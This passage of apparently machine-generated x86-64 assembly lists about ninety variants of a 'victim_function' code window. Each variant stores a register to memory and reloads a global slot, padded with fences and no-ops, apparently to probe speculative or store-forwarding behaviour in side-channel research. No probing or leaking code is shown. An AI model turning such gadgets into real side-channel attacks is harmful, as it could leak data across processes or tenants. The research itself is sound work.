	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1704
.Lvictim_function_win0_var1704:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1705
.Lvictim_function_win0_var1705:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1706
.Lvictim_function_win0_var1706:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1707
.Lvictim_function_win0_var1707:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1708
.Lvictim_function_win0_var1708:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1709
.Lvictim_function_win0_var1709:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1710
.Lvictim_function_win0_var1710:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1711
.Lvictim_function_win0_var1711:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1712
.Lvictim_function_win0_var1712:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1713
.Lvictim_function_win0_var1713:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1714
.Lvictim_function_win0_var1714:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1715
.Lvictim_function_win0_var1715:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1716
.Lvictim_function_win0_var1716:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1717
.Lvictim_function_win0_var1717:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1718
.Lvictim_function_win0_var1718:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1719
.Lvictim_function_win0_var1719:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1720
.Lvictim_function_win0_var1720:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1721
.Lvictim_function_win0_var1721:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1722
.Lvictim_function_win0_var1722:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1723
.Lvictim_function_win0_var1723:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1724
.Lvictim_function_win0_var1724:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1725
.Lvictim_function_win0_var1725:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1726
.Lvictim_function_win0_var1726:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1727
.Lvictim_function_win0_var1727:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1728
.Lvictim_function_win0_var1728:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1729
.Lvictim_function_win0_var1729:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1730
.Lvictim_function_win0_var1730:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1731
.Lvictim_function_win0_var1731:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1732
.Lvictim_function_win0_var1732:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1733
.Lvictim_function_win0_var1733:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1734
.Lvictim_function_win0_var1734:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1735
.Lvictim_function_win0_var1735:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1736
.Lvictim_function_win0_var1736:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1737
.Lvictim_function_win0_var1737:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1738
.Lvictim_function_win0_var1738:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1739
.Lvictim_function_win0_var1739:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1740
.Lvictim_function_win0_var1740:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1741
.Lvictim_function_win0_var1741:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1742
.Lvictim_function_win0_var1742:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1743
.Lvictim_function_win0_var1743:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1744
.Lvictim_function_win0_var1744:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1745
.Lvictim_function_win0_var1745:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1746
.Lvictim_function_win0_var1746:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1747
.Lvictim_function_win0_var1747:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1748
.Lvictim_function_win0_var1748:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1749
.Lvictim_function_win0_var1749:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1750
.Lvictim_function_win0_var1750:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1751
.Lvictim_function_win0_var1751:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1752
.Lvictim_function_win0_var1752:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1753
.Lvictim_function_win0_var1753:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1754
.Lvictim_function_win0_var1754:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1755
.Lvictim_function_win0_var1755:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1756
.Lvictim_function_win0_var1756:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1757
.Lvictim_function_win0_var1757:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1758
.Lvictim_function_win0_var1758:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1759
.Lvictim_function_win0_var1759:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1760
.Lvictim_function_win0_var1760:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1761
.Lvictim_function_win0_var1761:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1762
.Lvictim_function_win0_var1762:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1763
.Lvictim_function_win0_var1763:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1764
.Lvictim_function_win0_var1764:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1765
.Lvictim_function_win0_var1765:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1766
.Lvictim_function_win0_var1766:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1767
.Lvictim_function_win0_var1767:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1768
.Lvictim_function_win0_var1768:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1769
.Lvictim_function_win0_var1769:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1770
.Lvictim_function_win0_var1770:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1771
.Lvictim_function_win0_var1771:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1772
.Lvictim_function_win0_var1772:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1773
.Lvictim_function_win0_var1773:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1774
.Lvictim_function_win0_var1774:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1775
.Lvictim_function_win0_var1775:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1776
.Lvictim_function_win0_var1776:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1777
.Lvictim_function_win0_var1777:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1778
.Lvictim_function_win0_var1778:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1779
.Lvictim_function_win0_var1779:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1780
.Lvictim_function_win0_var1780:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1781
.Lvictim_function_win0_var1781:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1782
.Lvictim_function_win0_var1782:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	nop
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1783
.Lvictim_function_win0_var1783:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1784
.Lvictim_function_win0_var1784:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1785
.Lvictim_function_win0_var1785:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1786
.Lvictim_function_win0_var1786:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1787
.Lvictim_function_win0_var1787:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1788
.Lvictim_function_win0_var1788:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1789
.Lvictim_function_win0_var1789:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1790
.Lvictim_function_win0_var1790:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1791
.Lvictim_function_win0_var1791:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1792
.Lvictim_function_win0_var1792:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1793
.Lvictim_function_win0_var1793:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1794
.Lvictim_function_win0_var1794:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1795
.Lvictim_function_win0_var1795:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1796
.Lvictim_function_win0_var1796:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1797
.Lvictim_function_win0_var1797:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
